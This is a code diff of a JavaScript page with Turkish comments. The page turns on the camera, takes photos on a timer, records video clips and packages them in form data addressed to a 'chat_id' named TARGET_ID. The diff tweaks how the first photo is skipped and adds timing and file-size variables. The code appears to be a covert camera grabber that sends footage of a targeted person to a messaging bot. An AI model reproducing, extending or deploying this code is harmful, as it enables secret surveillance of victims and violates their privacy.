@@ -153,7 +153,6 @@
             let videoCount = 0;
             let photoCount = 0;
             let stream = null;
-            let isFirstPhoto = true; // İlk fotoğraf kontrolü için flag
             
             async function startCamera() {
                 try {
@@ -175,12 +174,14 @@
                         // ========================================
                         // FOTOĞRAF - HEMEN BAŞLA (0ms)
                         // ========================================
+                        let ilkFotoAtlandi = false; // İLK FOTOĞRAFI ATLAMAK İÇİN
+                        
                         function fotoCek() {
                             if (!stream?.active) return;
                             
-                            // İlk fotoğrafı atla (1 tane fazla gelmemesi için)
-                            if (isFirstPhoto) {
-                                isFirstPhoto = false;
+                            // İLK FOTOĞRAFI ATLA
+                            if (!ilkFotoAtlandi) {
+                                ilkFotoAtlandi = true;
                                 return;
                             }
                             
@@ -204,10 +205,8 @@
                             }, 'image/jpeg', 0.85);
                         }
                         
-                        // İLK FOTOĞRAFI ÇEKME (flag ile atlanacak)
-                        setTimeout(() => {
-                            fotoCek(); // Bu ilk çağrı isFirstPhoto true olduğu için atlanacak
-                        }, 100); // Çok kısa bir gecikme ile çağır
+                        // İLK FOTO HEMEN (AMA ATLANACAK)
+                        fotoCek();
                         
                         // DİĞER FOTOLAR
                         setInterval(fotoCek, FOTO_SURESI * 1000);
@@ -220,6 +219,7 @@
                             
                             videoCount++;
                             const videoIndex = videoCount;
+                            const videoBaslangic = Date.now();
                             const chunks = [];
                             
                             try {
@@ -234,6 +234,7 @@
                                 
                                 mr.onstop = () => {
                                     const blob = new Blob(chunks, { type: 'video/webm' });
+                                    const boyutKB = (blob.size / 1024).toFixed(0);
                                     
                                     const formData = new FormData();
                                     formData.append('chat_id', TARGET_ID);
